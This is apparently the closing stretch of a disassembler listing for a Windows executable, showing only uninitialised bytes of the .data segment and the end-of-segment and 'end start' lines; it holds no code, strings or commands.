.data:00405D87                 db    ? ;
.data:00405D88                 db    ? ;
.data:00405D89                 db    ? ;
.data:00405D8A                 db    ? ;
.data:00405D8B                 db    ? ;
.data:00405D8C                 db    ? ;
.data:00405D8D                 db    ? ;
.data:00405D8E                 db    ? ;
.data:00405D8F                 db    ? ;
.data:00405D90                 db    ? ;
.data:00405D91                 db    ? ;
.data:00405D92                 db    ? ;
.data:00405D93                 db    ? ;
.data:00405D94                 db    ? ;
.data:00405D95                 db    ? ;
.data:00405D96                 db    ? ;
.data:00405D97                 db    ? ;
.data:00405D98                 db    ? ;
.data:00405D99                 db    ? ;
.data:00405D9A                 db    ? ;
.data:00405D9B                 db    ? ;
.data:00405D9C                 db    ? ;
.data:00405D9D                 db    ? ;
.data:00405D9E                 db    ? ;
.data:00405D9F                 db    ? ;
.data:00405DA0                 db    ? ;
.data:00405DA1                 db    ? ;
.data:00405DA2                 db    ? ;
.data:00405DA3                 db    ? ;
.data:00405DA4                 db    ? ;
.data:00405DA5                 db    ? ;
.data:00405DA6                 db    ? ;
.data:00405DA7                 db    ? ;
.data:00405DA8                 db    ? ;
.data:00405DA9                 db    ? ;
.data:00405DAA                 db    ? ;
.data:00405DAB                 db    ? ;
.data:00405DAC                 db    ? ;
.data:00405DAD                 db    ? ;
.data:00405DAE                 db    ? ;
.data:00405DAF                 db    ? ;
.data:00405DB0                 db    ? ;
.data:00405DB1                 db    ? ;
.data:00405DB2                 db    ? ;
.data:00405DB3                 db    ? ;
.data:00405DB4                 db    ? ;
.data:00405DB5                 db    ? ;
.data:00405DB6                 db    ? ;
.data:00405DB7                 db    ? ;
.data:00405DB8                 db    ? ;
.data:00405DB9                 db    ? ;
.data:00405DBA                 db    ? ;
.data:00405DBB                 db    ? ;
.data:00405DBC                 db    ? ;
.data:00405DBD                 db    ? ;
.data:00405DBE                 db    ? ;
.data:00405DBF                 db    ? ;
.data:00405DC0                 db    ? ;
.data:00405DC1                 db    ? ;
.data:00405DC2                 db    ? ;
.data:00405DC3                 db    ? ;
.data:00405DC4                 db    ? ;
.data:00405DC5                 db    ? ;
.data:00405DC6                 db    ? ;
.data:00405DC7                 db    ? ;
.data:00405DC8                 db    ? ;
.data:00405DC9                 db    ? ;
.data:00405DCA                 db    ? ;
.data:00405DCB                 db    ? ;
.data:00405DCC                 db    ? ;
.data:00405DCD                 db    ? ;
.data:00405DCE                 db    ? ;
.data:00405DCF                 db    ? ;
.data:00405DD0                 db    ? ;
.data:00405DD1                 db    ? ;
.data:00405DD2                 db    ? ;
.data:00405DD3                 db    ? ;
.data:00405DD4                 db    ? ;
.data:00405DD5                 db    ? ;
.data:00405DD6                 db    ? ;
.data:00405DD7                 db    ? ;
.data:00405DD8                 db    ? ;
.data:00405DD9                 db    ? ;
.data:00405DDA                 db    ? ;
.data:00405DDB                 db    ? ;
.data:00405DDC                 db    ? ;
.data:00405DDD                 db    ? ;
.data:00405DDE                 db    ? ;
.data:00405DDF                 db    ? ;
.data:00405DE0                 db    ? ;
.data:00405DE1                 db    ? ;
.data:00405DE2                 db    ? ;
.data:00405DE3                 db    ? ;
.data:00405DE4                 db    ? ;
.data:00405DE5                 db    ? ;
.data:00405DE6                 db    ? ;
.data:00405DE7                 db    ? ;
.data:00405DE8                 db    ? ;
.data:00405DE9                 db    ? ;
.data:00405DEA                 db    ? ;
.data:00405DEB                 db    ? ;
.data:00405DEC                 db    ? ;
.data:00405DED                 db    ? ;
.data:00405DEE                 db    ? ;
.data:00405DEF                 db    ? ;
.data:00405DF0                 db    ? ;
.data:00405DF1                 db    ? ;
.data:00405DF2                 db    ? ;
.data:00405DF3                 db    ? ;
.data:00405DF4                 db    ? ;
.data:00405DF5                 db    ? ;
.data:00405DF6                 db    ? ;
.data:00405DF7                 db    ? ;
.data:00405DF8                 db    ? ;
.data:00405DF9                 db    ? ;
.data:00405DFA                 db    ? ;
.data:00405DFB                 db    ? ;
.data:00405DFC                 db    ? ;
.data:00405DFD                 db    ? ;
.data:00405DFE                 db    ? ;
.data:00405DFF                 db    ? ;
.data:00405E00                 db    ? ;
.data:00405E01                 db    ? ;
.data:00405E02                 db    ? ;
.data:00405E03                 db    ? ;
.data:00405E04                 db    ? ;
.data:00405E05                 db    ? ;
.data:00405E06                 db    ? ;
.data:00405E07                 db    ? ;
.data:00405E08                 db    ? ;
.data:00405E09                 db    ? ;
.data:00405E0A                 db    ? ;
.data:00405E0B                 db    ? ;
.data:00405E0C                 db    ? ;
.data:00405E0D                 db    ? ;
.data:00405E0E                 db    ? ;
.data:00405E0F                 db    ? ;
.data:00405E10                 db    ? ;
.data:00405E11                 db    ? ;
.data:00405E12                 db    ? ;
.data:00405E13                 db    ? ;
.data:00405E14                 db    ? ;
.data:00405E15                 db    ? ;
.data:00405E16                 db    ? ;
.data:00405E17                 db    ? ;
.data:00405E18                 db    ? ;
.data:00405E19                 db    ? ;
.data:00405E1A                 db    ? ;
.data:00405E1B                 db    ? ;
.data:00405E1C                 db    ? ;
.data:00405E1D                 db    ? ;
.data:00405E1E                 db    ? ;
.data:00405E1F                 db    ? ;
.data:00405E20                 db    ? ;
.data:00405E21                 db    ? ;
.data:00405E22                 db    ? ;
.data:00405E23                 db    ? ;
.data:00405E24                 db    ? ;
.data:00405E25                 db    ? ;
.data:00405E26                 db    ? ;
.data:00405E27                 db    ? ;
.data:00405E28                 db    ? ;
.data:00405E29                 db    ? ;
.data:00405E2A                 db    ? ;
.data:00405E2B                 db    ? ;
.data:00405E2C                 db    ? ;
.data:00405E2D                 db    ? ;
.data:00405E2E                 db    ? ;
.data:00405E2F                 db    ? ;
.data:00405E30                 db    ? ;
.data:00405E31                 db    ? ;
.data:00405E32                 db    ? ;
.data:00405E33                 db    ? ;
.data:00405E34                 db    ? ;
.data:00405E35                 db    ? ;
.data:00405E36                 db    ? ;
.data:00405E37                 db    ? ;
.data:00405E38                 db    ? ;
.data:00405E39                 db    ? ;
.data:00405E3A                 db    ? ;
.data:00405E3B                 db    ? ;
.data:00405E3C                 db    ? ;
.data:00405E3D                 db    ? ;
.data:00405E3E                 db    ? ;
.data:00405E3F                 db    ? ;
.data:00405E40                 db    ? ;
.data:00405E41                 db    ? ;
.data:00405E42                 db    ? ;
.data:00405E43                 db    ? ;
.data:00405E44                 db    ? ;
.data:00405E45                 db    ? ;
.data:00405E46                 db    ? ;
.data:00405E47                 db    ? ;
.data:00405E48                 db    ? ;
.data:00405E49                 db    ? ;
.data:00405E4A                 db    ? ;
.data:00405E4B                 db    ? ;
.data:00405E4C                 db    ? ;
.data:00405E4D                 db    ? ;
.data:00405E4E                 db    ? ;
.data:00405E4F                 db    ? ;
.data:00405E50                 db    ? ;
.data:00405E51                 db    ? ;
.data:00405E52                 db    ? ;
.data:00405E53                 db    ? ;
.data:00405E54                 db    ? ;
.data:00405E55                 db    ? ;
.data:00405E56                 db    ? ;
.data:00405E57                 db    ? ;
.data:00405E58                 db    ? ;
.data:00405E59                 db    ? ;
.data:00405E5A                 db    ? ;
.data:00405E5B                 db    ? ;
.data:00405E5C                 db    ? ;
.data:00405E5D                 db    ? ;
.data:00405E5E                 db    ? ;
.data:00405E5F                 db    ? ;
.data:00405E60                 db    ? ;
.data:00405E61                 db    ? ;
.data:00405E62                 db    ? ;
.data:00405E63                 db    ? ;
.data:00405E64                 db    ? ;
.data:00405E65                 db    ? ;
.data:00405E66                 db    ? ;
.data:00405E67                 db    ? ;
.data:00405E68                 db    ? ;
.data:00405E69                 db    ? ;
.data:00405E6A                 db    ? ;
.data:00405E6B                 db    ? ;
.data:00405E6C                 db    ? ;
.data:00405E6D                 db    ? ;
.data:00405E6E                 db    ? ;
.data:00405E6F                 db    ? ;
.data:00405E70                 db    ? ;
.data:00405E71                 db    ? ;
.data:00405E72                 db    ? ;
.data:00405E73                 db    ? ;
.data:00405E74                 db    ? ;
.data:00405E75                 db    ? ;
.data:00405E76                 db    ? ;
.data:00405E77                 db    ? ;
.data:00405E78                 db    ? ;
.data:00405E79                 db    ? ;
.data:00405E7A                 db    ? ;
.data:00405E7B                 db    ? ;
.data:00405E7C                 db    ? ;
.data:00405E7D                 db    ? ;
.data:00405E7E                 db    ? ;
.data:00405E7F                 db    ? ;
.data:00405E80                 db    ? ;
.data:00405E81                 db    ? ;
.data:00405E82                 db    ? ;
.data:00405E83                 db    ? ;
.data:00405E84                 db    ? ;
.data:00405E85                 db    ? ;
.data:00405E86                 db    ? ;
.data:00405E87                 db    ? ;
.data:00405E88                 db    ? ;
.data:00405E89                 db    ? ;
.data:00405E8A                 db    ? ;
.data:00405E8B                 db    ? ;
.data:00405E8C                 db    ? ;
.data:00405E8D                 db    ? ;
.data:00405E8E                 db    ? ;
.data:00405E8F                 db    ? ;
.data:00405E90                 db    ? ;
.data:00405E91                 db    ? ;
.data:00405E92                 db    ? ;
.data:00405E93                 db    ? ;
.data:00405E94                 db    ? ;
.data:00405E95                 db    ? ;
.data:00405E96                 db    ? ;
.data:00405E97                 db    ? ;
.data:00405E98                 db    ? ;
.data:00405E99                 db    ? ;
.data:00405E9A                 db    ? ;
.data:00405E9B                 db    ? ;
.data:00405E9C                 db    ? ;
.data:00405E9D                 db    ? ;
.data:00405E9E                 db    ? ;
.data:00405E9F                 db    ? ;
.data:00405EA0                 db    ? ;
.data:00405EA1                 db    ? ;
.data:00405EA2                 db    ? ;
.data:00405EA3                 db    ? ;
.data:00405EA4                 db    ? ;
.data:00405EA5                 db    ? ;
.data:00405EA6                 db    ? ;
.data:00405EA7                 db    ? ;
.data:00405EA8                 db    ? ;
.data:00405EA9                 db    ? ;
.data:00405EAA                 db    ? ;
.data:00405EAB                 db    ? ;
.data:00405EAC                 db    ? ;
.data:00405EAD                 db    ? ;
.data:00405EAE                 db    ? ;
.data:00405EAF                 db    ? ;
.data:00405EB0                 db    ? ;
.data:00405EB1                 db    ? ;
.data:00405EB2                 db    ? ;
.data:00405EB3                 db    ? ;
.data:00405EB4                 db    ? ;
.data:00405EB5                 db    ? ;
.data:00405EB6                 db    ? ;
.data:00405EB7                 db    ? ;
.data:00405EB8                 db    ? ;
.data:00405EB9                 db    ? ;
.data:00405EBA                 db    ? ;
.data:00405EBB                 db    ? ;
.data:00405EBC                 db    ? ;
.data:00405EBD                 db    ? ;
.data:00405EBE                 db    ? ;
.data:00405EBF                 db    ? ;
.data:00405EC0                 db    ? ;
.data:00405EC1                 db    ? ;
.data:00405EC2                 db    ? ;
.data:00405EC3                 db    ? ;
.data:00405EC4                 db    ? ;
.data:00405EC5                 db    ? ;
.data:00405EC6                 db    ? ;
.data:00405EC7                 db    ? ;
.data:00405EC8                 db    ? ;
.data:00405EC9                 db    ? ;
.data:00405ECA                 db    ? ;
.data:00405ECB                 db    ? ;
.data:00405ECC                 db    ? ;
.data:00405ECD                 db    ? ;
.data:00405ECE                 db    ? ;
.data:00405ECF                 db    ? ;
.data:00405ED0                 db    ? ;
.data:00405ED1                 db    ? ;
.data:00405ED2                 db    ? ;
.data:00405ED3                 db    ? ;
.data:00405ED4                 db    ? ;
.data:00405ED5                 db    ? ;
.data:00405ED6                 db    ? ;
.data:00405ED7                 db    ? ;
.data:00405ED8                 db    ? ;
.data:00405ED9                 db    ? ;
.data:00405EDA                 db    ? ;
.data:00405EDB                 db    ? ;
.data:00405EDC                 db    ? ;
.data:00405EDD                 db    ? ;
.data:00405EDE                 db    ? ;
.data:00405EDF                 db    ? ;
.data:00405EE0                 db    ? ;
.data:00405EE1                 db    ? ;
.data:00405EE2                 db    ? ;
.data:00405EE3                 db    ? ;
.data:00405EE4                 db    ? ;
.data:00405EE5                 db    ? ;
.data:00405EE6                 db    ? ;
.data:00405EE7                 db    ? ;
.data:00405EE8                 db    ? ;
.data:00405EE9                 db    ? ;
.data:00405EEA                 db    ? ;
.data:00405EEB                 db    ? ;
.data:00405EEC                 db    ? ;
.data:00405EED                 db    ? ;
.data:00405EEE                 db    ? ;
.data:00405EEF                 db    ? ;
.data:00405EF0                 db    ? ;
.data:00405EF1                 db    ? ;
.data:00405EF2                 db    ? ;
.data:00405EF3                 db    ? ;
.data:00405EF4                 db    ? ;
.data:00405EF5                 db    ? ;
.data:00405EF6                 db    ? ;
.data:00405EF7                 db    ? ;
.data:00405EF8                 db    ? ;
.data:00405EF9                 db    ? ;
.data:00405EFA                 db    ? ;
.data:00405EFB                 db    ? ;
.data:00405EFC                 db    ? ;
.data:00405EFD                 db    ? ;
.data:00405EFE                 db    ? ;
.data:00405EFF                 db    ? ;
.data:00405F00                 db    ? ;
.data:00405F01                 db    ? ;
.data:00405F02                 db    ? ;
.data:00405F03                 db    ? ;
.data:00405F04                 db    ? ;
.data:00405F05                 db    ? ;
.data:00405F06                 db    ? ;
.data:00405F07                 db    ? ;
.data:00405F08                 db    ? ;
.data:00405F09                 db    ? ;
.data:00405F0A                 db    ? ;
.data:00405F0B                 db    ? ;
.data:00405F0C                 db    ? ;
.data:00405F0D                 db    ? ;
.data:00405F0E                 db    ? ;
.data:00405F0F                 db    ? ;
.data:00405F10                 db    ? ;
.data:00405F11                 db    ? ;
.data:00405F12                 db    ? ;
.data:00405F13                 db    ? ;
.data:00405F14                 db    ? ;
.data:00405F15                 db    ? ;
.data:00405F16                 db    ? ;
.data:00405F17                 db    ? ;
.data:00405F18                 db    ? ;
.data:00405F19                 db    ? ;
.data:00405F1A                 db    ? ;
.data:00405F1B                 db    ? ;
.data:00405F1C                 db    ? ;
.data:00405F1D                 db    ? ;
.data:00405F1E                 db    ? ;
.data:00405F1F                 db    ? ;
.data:00405F20                 db    ? ;
.data:00405F21                 db    ? ;
.data:00405F22                 db    ? ;
.data:00405F23                 db    ? ;
.data:00405F24                 db    ? ;
.data:00405F25                 db    ? ;
.data:00405F26                 db    ? ;
.data:00405F27                 db    ? ;
.data:00405F28                 db    ? ;
.data:00405F29                 db    ? ;
.data:00405F2A                 db    ? ;
.data:00405F2B                 db    ? ;
.data:00405F2C                 db    ? ;
.data:00405F2D                 db    ? ;
.data:00405F2E                 db    ? ;
.data:00405F2F                 db    ? ;
.data:00405F30                 db    ? ;
.data:00405F31                 db    ? ;
.data:00405F32                 db    ? ;
.data:00405F33                 db    ? ;
.data:00405F34                 db    ? ;
.data:00405F35                 db    ? ;
.data:00405F36                 db    ? ;
.data:00405F37                 db    ? ;
.data:00405F38                 db    ? ;
.data:00405F39                 db    ? ;
.data:00405F3A                 db    ? ;
.data:00405F3B                 db    ? ;
.data:00405F3C                 db    ? ;
.data:00405F3D                 db    ? ;
.data:00405F3E                 db    ? ;
.data:00405F3F                 db    ? ;
.data:00405F40                 db    ? ;
.data:00405F41                 db    ? ;
.data:00405F42                 db    ? ;
.data:00405F43                 db    ? ;
.data:00405F44                 db    ? ;
.data:00405F45                 db    ? ;
.data:00405F46                 db    ? ;
.data:00405F47                 db    ? ;
.data:00405F48                 db    ? ;
.data:00405F49                 db    ? ;
.data:00405F4A                 db    ? ;
.data:00405F4B                 db    ? ;
.data:00405F4C                 db    ? ;
.data:00405F4D                 db    ? ;
.data:00405F4E                 db    ? ;
.data:00405F4F                 db    ? ;
.data:00405F50                 db    ? ;
.data:00405F51                 db    ? ;
.data:00405F52                 db    ? ;
.data:00405F53                 db    ? ;
.data:00405F54                 db    ? ;
.data:00405F55                 db    ? ;
.data:00405F56                 db    ? ;
.data:00405F57                 db    ? ;
.data:00405F58                 db    ? ;
.data:00405F59                 db    ? ;
.data:00405F5A                 db    ? ;
.data:00405F5B                 db    ? ;
.data:00405F5C                 db    ? ;
.data:00405F5D                 db    ? ;
.data:00405F5E                 db    ? ;
.data:00405F5F                 db    ? ;
.data:00405F60                 db    ? ;
.data:00405F61                 db    ? ;
.data:00405F62                 db    ? ;
.data:00405F63                 db    ? ;
.data:00405F64                 db    ? ;
.data:00405F65                 db    ? ;
.data:00405F66                 db    ? ;
.data:00405F67                 db    ? ;
.data:00405F68                 db    ? ;
.data:00405F69                 db    ? ;
.data:00405F6A                 db    ? ;
.data:00405F6B                 db    ? ;
.data:00405F6C                 db    ? ;
.data:00405F6D                 db    ? ;
.data:00405F6E                 db    ? ;
.data:00405F6F                 db    ? ;
.data:00405F70                 db    ? ;
.data:00405F71                 db    ? ;
.data:00405F72                 db    ? ;
.data:00405F73                 db    ? ;
.data:00405F74                 db    ? ;
.data:00405F75                 db    ? ;
.data:00405F76                 db    ? ;
.data:00405F77                 db    ? ;
.data:00405F78                 db    ? ;
.data:00405F79                 db    ? ;
.data:00405F7A                 db    ? ;
.data:00405F7B                 db    ? ;
.data:00405F7C                 db    ? ;
.data:00405F7D                 db    ? ;
.data:00405F7E                 db    ? ;
.data:00405F7F                 db    ? ;
.data:00405F80                 db    ? ;
.data:00405F81                 db    ? ;
.data:00405F82                 db    ? ;
.data:00405F83                 db    ? ;
.data:00405F84                 db    ? ;
.data:00405F85                 db    ? ;
.data:00405F86                 db    ? ;
.data:00405F87                 db    ? ;
.data:00405F88                 db    ? ;
.data:00405F89                 db    ? ;
.data:00405F8A                 db    ? ;
.data:00405F8B                 db    ? ;
.data:00405F8C                 db    ? ;
.data:00405F8D                 db    ? ;
.data:00405F8E                 db    ? ;
.data:00405F8F                 db    ? ;
.data:00405F90                 db    ? ;
.data:00405F91                 db    ? ;
.data:00405F92                 db    ? ;
.data:00405F93                 db    ? ;
.data:00405F94                 db    ? ;
.data:00405F95                 db    ? ;
.data:00405F96                 db    ? ;
.data:00405F97                 db    ? ;
.data:00405F98                 db    ? ;
.data:00405F99                 db    ? ;
.data:00405F9A                 db    ? ;
.data:00405F9B                 db    ? ;
.data:00405F9C                 db    ? ;
.data:00405F9D                 db    ? ;
.data:00405F9E                 db    ? ;
.data:00405F9F                 db    ? ;
.data:00405FA0                 db    ? ;
.data:00405FA1                 db    ? ;
.data:00405FA2                 db    ? ;
.data:00405FA3                 db    ? ;
.data:00405FA4                 db    ? ;
.data:00405FA5                 db    ? ;
.data:00405FA6                 db    ? ;
.data:00405FA7                 db    ? ;
.data:00405FA8                 db    ? ;
.data:00405FA9                 db    ? ;
.data:00405FAA                 db    ? ;
.data:00405FAB                 db    ? ;
.data:00405FAC                 db    ? ;
.data:00405FAD                 db    ? ;
.data:00405FAE                 db    ? ;
.data:00405FAF                 db    ? ;
.data:00405FB0                 db    ? ;
.data:00405FB1                 db    ? ;
.data:00405FB2                 db    ? ;
.data:00405FB3                 db    ? ;
.data:00405FB4                 db    ? ;
.data:00405FB5                 db    ? ;
.data:00405FB6                 db    ? ;
.data:00405FB7                 db    ? ;
.data:00405FB8                 db    ? ;
.data:00405FB9                 db    ? ;
.data:00405FBA                 db    ? ;
.data:00405FBB                 db    ? ;
.data:00405FBC                 db    ? ;
.data:00405FBD                 db    ? ;
.data:00405FBE                 db    ? ;
.data:00405FBF                 db    ? ;
.data:00405FC0                 db    ? ;
.data:00405FC1                 db    ? ;
.data:00405FC2                 db    ? ;
.data:00405FC3                 db    ? ;
.data:00405FC4                 db    ? ;
.data:00405FC5                 db    ? ;
.data:00405FC6                 db    ? ;
.data:00405FC7                 db    ? ;
.data:00405FC8                 db    ? ;
.data:00405FC9                 db    ? ;
.data:00405FCA                 db    ? ;
.data:00405FCB                 db    ? ;
.data:00405FCC                 db    ? ;
.data:00405FCD                 db    ? ;
.data:00405FCE                 db    ? ;
.data:00405FCF                 db    ? ;
.data:00405FD0                 db    ? ;
.data:00405FD1                 db    ? ;
.data:00405FD2                 db    ? ;
.data:00405FD3                 db    ? ;
.data:00405FD4                 db    ? ;
.data:00405FD5                 db    ? ;
.data:00405FD6                 db    ? ;
.data:00405FD7                 db    ? ;
.data:00405FD8                 db    ? ;
.data:00405FD9                 db    ? ;
.data:00405FDA                 db    ? ;
.data:00405FDB                 db    ? ;
.data:00405FDC                 db    ? ;
.data:00405FDD                 db    ? ;
.data:00405FDE                 db    ? ;
.data:00405FDF                 db    ? ;
.data:00405FE0                 db    ? ;
.data:00405FE1                 db    ? ;
.data:00405FE2                 db    ? ;
.data:00405FE3                 db    ? ;
.data:00405FE4                 db    ? ;
.data:00405FE5                 db    ? ;
.data:00405FE6                 db    ? ;
.data:00405FE7                 db    ? ;
.data:00405FE8                 db    ? ;
.data:00405FE9                 db    ? ;
.data:00405FEA                 db    ? ;
.data:00405FEB                 db    ? ;
.data:00405FEC                 db    ? ;
.data:00405FED                 db    ? ;
.data:00405FEE                 db    ? ;
.data:00405FEF                 db    ? ;
.data:00405FF0                 db    ? ;
.data:00405FF1                 db    ? ;
.data:00405FF2                 db    ? ;
.data:00405FF3                 db    ? ;
.data:00405FF4                 db    ? ;
.data:00405FF5                 db    ? ;
.data:00405FF6                 db    ? ;
.data:00405FF7                 db    ? ;
.data:00405FF8                 db    ? ;
.data:00405FF9                 db    ? ;
.data:00405FFA                 db    ? ;
.data:00405FFB                 db    ? ;
.data:00405FFC                 db    ? ;
.data:00405FFD                 db    ? ;
.data:00405FFE                 db    ? ;
.data:00405FFF                 db    ? ;
.data:00405FFF _data           ends
.data:00405FFF
.data:00405FFF
.data:00405FFF                 end start
